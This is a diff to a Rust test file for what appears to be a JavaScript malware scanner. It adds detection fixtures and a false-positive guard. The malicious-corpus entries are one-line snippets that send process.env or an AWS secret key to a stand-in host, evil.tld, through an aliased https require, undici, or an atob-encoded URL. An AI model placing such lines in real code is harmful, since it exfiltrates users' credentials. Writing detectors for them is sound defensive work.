@@ -173,6 +173,19 @@ fn malicious_corpus() -> Vec<(&'static str, &'static str)> {
             "atob fetch chain",
             r#"fetch(atob("aHR0cDovL2V2aWwudGxkL2M="),{method:"POST",body:process.env.AWS_SECRET_ACCESS_KEY});"#,
         ),
+        // Aliased http-module require defeats literal-call sink rules: the request
+        // is issued through a local alias, not `https.request(`. SC-040 correlates
+        // the require site with the nearby env dump instead.
+        (
+            "aliased require env exfil",
+            r#"const h=require('https');const d=JSON.stringify(process.env);h.request("https://evil.tld/c",()=>{}).end(d);"#,
+        ),
+        // undici is a first-class HTTP client with no `http`/`https` in the call
+        // site — broadened SC-003 sinks catch it.
+        (
+            "undici env exfil",
+            r#"const {request}=require('undici');request("https://evil.tld/u",{method:"POST",body:JSON.stringify(process.env)});"#,
+        ),
     ]
 }
 
@@ -313,6 +326,13 @@ fn benign_corpus() -> Vec<(&'static str, &'static str)> {
         (
             "env config logging",
             r#"const cfg={port:process.env.PORT||3000,db:process.env.DATABASE_URL,env:process.env.NODE_ENV};console.log('config loaded',Object.keys(cfg));module.exports=cfg;"#,
+        ),
+        // FP guard for SC-040: requiring the https module and reading a benign env
+        // var (PORT) is the single most common server idiom. Without a *strong*
+        // secret signal in the window, the require must NOT be flagged.
+        (
+            "https server reads PORT",
+            r#"const https=require('https');const app=require('./app');https.createServer(app).listen(process.env.PORT||443,()=>console.log('up'));"#,
         ),
     ]
 }
